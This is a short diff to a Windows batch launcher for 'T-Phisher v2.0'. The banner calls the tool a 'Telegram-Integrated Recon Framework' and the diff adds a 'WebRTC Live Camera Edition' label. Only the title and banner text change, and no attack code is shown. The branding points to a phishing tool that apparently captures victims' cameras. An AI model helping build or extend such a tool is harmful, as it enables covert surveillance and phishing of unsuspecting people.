@@ -1,5 +1,5 @@
 @echo off
-title T-Phisher v2.0 ^| Admin Panel
+title T-Phisher v2.0 ^| WebRTC Admin Panel
 color 0A
 
 :: ════════════════════════════════════════════════════════
@@ -9,10 +9,11 @@ color 0A
 :: ════════════════════════════════════════════════════════
 
 echo.
-echo  ╔══════════════════════════════════════════╗
-echo  ║          T-PHISHER v2.0 LAUNCHER         ║
-echo  ║   Telegram-Integrated Recon Framework    ║
-echo  ╚══════════════════════════════════════════╝
+echo  ╔══════════════════════════════════════════════╗
+echo  ║           T-PHISHER v2.0 LAUNCHER            ║
+echo  ║     Telegram-Integrated Recon Framework      ║
+echo  ║        [ WebRTC Live Camera Edition ]        ║
+echo  ╚══════════════════════════════════════════════╝
 echo.
 
 :: Check if Node.js is available
